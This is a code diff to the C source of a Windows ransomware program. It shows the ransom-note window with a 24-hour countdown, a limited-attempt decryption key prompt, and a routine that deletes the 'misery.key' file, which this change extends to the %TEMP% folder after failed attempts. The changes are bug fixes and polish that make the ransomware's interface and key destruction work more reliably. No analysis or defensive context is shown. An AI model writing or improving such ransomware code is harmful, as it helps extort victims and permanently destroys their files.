@@ -48,6 +48,7 @@ static HBRUSH  g_hbrAccent    = NULL;
 static HBRUSH  g_hbrCodeBg    = NULL;
 static HBRUSH  g_hbrDecryptBg = NULL;
 static HBRUSH  g_hbrTimerBg   = NULL;
+static HBRUSH  g_hbrCloseBtn  = NULL;  /* persistent brush for CLOSE button */
 static HFONT   g_hFontHead    = NULL;
 static HFONT   g_hFontSub     = NULL;
 static HFONT   g_hFontBody    = NULL;
@@ -85,8 +86,8 @@ static unsigned int __stdcall DecryptThreadProc(void *lpParam) {
 
     if (p->hWnd && IsWindow(p->hWnd)) {
         PostMessage(p->hWnd, WM_DECRYPT_DONE,
-                    (WPARAM)(success ? stats.filesSucceeded : -1),
-                    (LPARAM)(success ? stats.filesFailed : 0));
+                    (WPARAM)(success ? (LONGLONG)stats.filesSucceeded : -1),
+                    (LPARAM)(success ? (LONGLONG)stats.filesFailed : 0));
     }
 
     free(p);
@@ -188,10 +189,14 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
             WS_CHILD | WS_VISIBLE | SS_CENTERIMAGE,
             100, 92, 240, 28, hBanner, NULL, hInst, NULL);
 
-        /* ── Timer display (right side of banner) ── */
+        /* ── Timer display (right side of banner) ──
+         *  FIX: Direct child of hWnd, NOT hBanner.
+         *  This ensures GetDlgItem(hWnd, IDC_TIMER) finds it,
+         *  and WM_CTLCOLORSTATIC reaches RansomWndProc.
+         *  Coordinates are still window-relative (banner starts at 0,0). */
         CreateWindowExW(0, L"STATIC", L"24:00:00",
             WS_CHILD | WS_VISIBLE | SS_CENTER,
-            640, 95, 180, 60, hBanner, (HMENU)IDC_TIMER, hInst, NULL);
+            640, 95, 180, 60, hWnd, (HMENU)IDC_TIMER, hInst, NULL);
 
         /* ── Instructions body ── */
         const WCHAR *instructions =
@@ -307,7 +312,7 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
         WCHAR   winText[128] = {0};
         GetWindowTextW(hCtrl, winText, 128);
 
-        /* Timer display */
+        /* Timer display — now reachable because IDC_TIMER is a direct child */
         if (hCtrl == GetDlgItem(hWnd, IDC_TIMER)) {
             SetTextColor(hdc, CLR_TIMER_RED);
             SetBkColor(hdc, CLR_TIMER_BG);
@@ -416,10 +421,8 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
             SetTextColor(hdc, CLR_WHITE);
             SetBkColor(hdc, CLR_HEADLINE);
             SelectObject(hdc, g_hFontBody);
-            HBRUSH hbr = CreateSolidBrush(CLR_HEADLINE);
-            LRESULT ret = (LRESULT)hbr;
-            DeleteObject(hbr); /* safe: brush returned, Win32 copies it */
-            return ret;
+            /* FIX: Use persistent brush instead of create/delete leak */
+            return (LRESULT)g_hbrCloseBtn;
         }
         if (wcsstr(btnText, L"DECRYPT")) {
             SetTextColor(hdc, CLR_WHITE);
@@ -433,7 +436,7 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
     case WM_COMMAND:
         if (LOWORD(wParam) == IDC_CLOSE) {
             DestroyWindow(hWnd);
-            PostQuitMessage(0);
+            /* FIX: WM_DESTROY already calls PostQuitMessage — do NOT call it here */
             return 0;
         }
 
@@ -498,11 +501,11 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
             int remaining = MAX_DECRYPT_ATTEMPTS - g_decryptAttempts;
             snprintf(msgBuf, sizeof(msgBuf),
                 "Decryption FAILED: The key is incorrect.\n"
-                "Attempts remaining: %d / %d\n"
-                "After %d failed attempts, the key will be destroyed.",
-                remaining, MAX_DECRYPT_ATTEMPTS, MAX_DECRYPT_ATTEMPTS);
+                "Attempts remaining: %d / %d",
+                remaining, MAX_DECRYPT_ATTEMPTS);
 
-            SetWindowTextA(hStatus, "Wrong key. Try again.");
+            /* FIX: Show remaining attempts in the status bar too */
+            SetWindowTextA(hStatus, msgBuf);
 
             if (g_decryptAttempts >= MAX_DECRYPT_ATTEMPTS) {
                 MessageBoxA(hWnd,
@@ -596,10 +599,18 @@ static void DestroyKeyAndClose(HWND hWnd) {
         DeleteFileA(keyPath);
     }
 
+    /* Also delete from %TEMP% */
+    char tempPath[MAX_PATH];
+    if (GetTempPathA(MAX_PATH, tempPath)) {
+        char keyPath3[MAX_PATH * 2];
+        snprintf(keyPath3, sizeof(keyPath3), "%s\\misery.key", tempPath);
+        DeleteFileA(keyPath3);
+    }
+
     /* Also delete from current directory */
     char curDir[MAX_PATH];
     GetCurrentDirectoryA(MAX_PATH, curDir);
-    if (_stricmp(curDir, desktop) != 0) {
+    if (_stricmp(curDir, desktop) != 0 && _stricmp(curDir, tempPath) != 0) {
         char keyPath2[MAX_PATH * 2];
         snprintf(keyPath2, sizeof(keyPath2), "%s\\misery.key", curDir);
         DeleteFileA(keyPath2);
@@ -616,20 +627,21 @@ static void DestroyKeyAndClose(HWND hWnd) {
 
     KillTimer(hWnd, 1);
     DestroyWindow(hWnd);
-    PostQuitMessage(0);
+    /* FIX: WM_DESTROY will post the quit message — don't duplicate it */
 }
 
 /* ═══════════════════════════════════════════════════════════════
  * RESOURCE CREATION
  * ═══════════════════════════════════════════════════════════════ */
 static void CreateResources(void) {
-    g_hbrBanner   = CreateSolidBrush(CLR_BANNER_BG);
-    g_hbrBg       = CreateSolidBrush(CLR_BG);
-    g_hbrCard     = CreateSolidBrush(CLR_CARD_BG);
-    g_hbrAccent   = CreateSolidBrush(CLR_ACCENT_DARK);
-    g_hbrCodeBg   = CreateSolidBrush(CLR_CODE_BG);
+    g_hbrBanner    = CreateSolidBrush(CLR_BANNER_BG);
+    g_hbrBg        = CreateSolidBrush(CLR_BG);
+    g_hbrCard      = CreateSolidBrush(CLR_CARD_BG);
+    g_hbrAccent    = CreateSolidBrush(CLR_ACCENT_DARK);
+    g_hbrCodeBg    = CreateSolidBrush(CLR_CODE_BG);
     g_hbrDecryptBg = CreateSolidBrush(CLR_DECRYPT_BG);
-    g_hbrTimerBg  = CreateSolidBrush(CLR_TIMER_BG);
+    g_hbrTimerBg   = CreateSolidBrush(CLR_TIMER_BG);
+    g_hbrCloseBtn  = CreateSolidBrush(CLR_HEADLINE); /* FIX: persistent brush */
 
     LOGFONTW lf;
     ZeroMemory(&lf, sizeof(lf));
@@ -669,6 +681,7 @@ static void DestroyResources(void) {
     if (g_hbrCodeBg)   DeleteObject(g_hbrCodeBg);
     if (g_hbrDecryptBg) DeleteObject(g_hbrDecryptBg);
     if (g_hbrTimerBg)  DeleteObject(g_hbrTimerBg);
+    if (g_hbrCloseBtn) DeleteObject(g_hbrCloseBtn);
     if (g_hFontHead)   DeleteObject(g_hFontHead);
     if (g_hFontSub)    DeleteObject(g_hFontSub);
     if (g_hFontBody)   DeleteObject(g_hFontBody);
